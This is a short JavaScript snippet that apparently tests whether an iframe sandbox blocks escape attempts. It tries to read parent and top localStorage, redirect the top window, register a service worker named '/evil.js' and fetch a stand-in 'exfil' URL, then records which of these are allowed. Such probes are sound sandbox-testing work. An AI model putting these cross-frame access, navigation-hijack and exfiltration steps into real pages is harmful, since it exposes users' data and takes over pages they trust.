const results = {};
try { results.parent = parent.localStorage.length; } catch { results.parent = 'blocked'; }
try { results.top = top.localStorage.length; } catch { results.top = 'blocked'; }
try { localStorage.setItem('attack', 'yes'); results.storage = 'allowed'; } catch { results.storage = 'blocked'; }
try { top.location.href = 'https://example.invalid/top'; results.topNavigation = 'allowed'; } catch { results.topNavigation = 'blocked'; }
try { navigator.serviceWorker.register('/evil.js').catch(() => {}); results.sw = 'allowed'; } catch { results.sw = 'blocked'; }
fetch('https://example.invalid/exfil').then(() => { results.fetch = 'allowed'; }, () => { results.fetch = 'blocked'; }).finally(() => { document.getElementById('results').textContent = JSON.stringify(results); });
